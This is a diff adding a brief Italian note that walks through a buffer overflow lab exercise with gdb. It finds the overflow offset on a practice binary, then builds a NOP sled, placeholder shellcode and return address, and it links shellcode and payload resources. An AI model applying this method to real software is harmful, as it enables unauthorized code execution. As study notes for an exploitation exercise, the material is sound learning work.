@@ -1,0 +1,20 @@
+https://github.com/swisskyrepo/PayloadsAllTheThings
+https://shell-storm.org/shellcode/files/shellcode-575.html
+ESERCIZIO BUFFER OVERFLOW
+1. entro nella cartella
+2. gdb ./bof (eseguibile) se non eseguibile chmod +x bof
+3. run
+4. info functions (0x56556030)
+5. run $(python -c "print('A'*N+'BBBB')") -> N = tentativi -> tentativi capisci che sono giusti quando ritorna 0x42424242 nonchè il valore di BBBB
+6. run $(python -c "print('A'*622+'BBBB')")
+7. apro nuova shell
+8. ipython3 len("[shell-code]") -> risultato: 46
+9. torno su gdb
+10. br * 0x56556030
+11. run $(python -c "print('\x90'*(622-46) + '[shell-code]')")
+12. il programma si ferma al breakpoint
+13. x/700xw $esp
+14. andiamo a vedere l'indirizzo della prima cella di memoria che non contiene \x90 -> questo sarà il nostro indirizzo di ritorno -> 0xffffd2ac
+15. bisogna togliere il breakpoint -> info break (ritorna il breakpoint) -> del [breakpoint]
+16. run $(python -c "print('\x90'*(622-46) + '[shell-code]' + '[indirizzo-di-ritorno]')")
+17. l'indirizzo di ritorno è uno tra i 90
